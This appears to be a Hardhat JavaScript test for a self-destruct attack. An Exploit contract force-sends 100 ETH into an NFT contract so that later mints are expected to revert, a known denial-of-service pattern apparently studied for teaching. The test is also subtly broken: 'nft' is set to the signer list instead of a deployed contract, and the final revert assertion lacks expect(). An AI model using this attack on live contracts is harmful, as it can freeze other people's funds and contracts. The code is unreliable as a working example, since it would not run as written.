const { expect } = require("chai")
const { ethers } = require("hardhat")

const tokens = (nft) => {
    return ethers.utils.parseUnits(nft.toString(), "ether")
}

const ether = tokens

describe("Self Destruct", () => {
    let nft, exploit
    let deployer, collector1, collector2, collector3, attacker

    beforeEach(async () => {
        const NFT = await ethers.getContractFactory("NFT")

        nft = await ethers.getSigners()

        let accounts = await ethers.getSigners()

        deployer = accounts[0]
        collector1 = accounts[1]
        collector2 = accounts[2]
        collector3 = accounts[3]
        attacker = accounts[4]

        const Exploit = await ethers.getContractFactory("Exploit")

        exploit = await Exploit.deploy(nft.address)
    })

    describe("Exploit vulnerability", () => {
        let transaction, result

        it ("Forces ETH payload into the contract and bypass any blockchain validation", async () => {
            /* Collector 1 mints a token */
            transaction = await nft.connect(collector1).mint({ value: ether(1) })

            await transaction.wait()
            expect(await nft.ownerOf(1)).to.equal(collector1.address)
            expect(await ethers.provider.getBalance(nft.address)).to.equal(ether(1))

            /* Collector 2 mints a token */
            transaction = await exploit.connect(collector2).mint({ value: ether(1) })

            await transaction.wait()
            expect(await nft.ownerOf(2)).to.equal(collector2.address)
            expect(await ethers.provider.getBalance(nft.address)).to.equal(ether(2))

            /* Attacker exploits then self-destructs */
            transaction = await exploit.connect(attacker).attack({ value: ether(100) })

            await transaction.wait()
            expect(await ethers.provider.getBalance(nft.address)).to.equal(ether(102))
            await(nft.connect(collector3).mint({ value: ether(1) })).to.be.reverted
        })
    })
})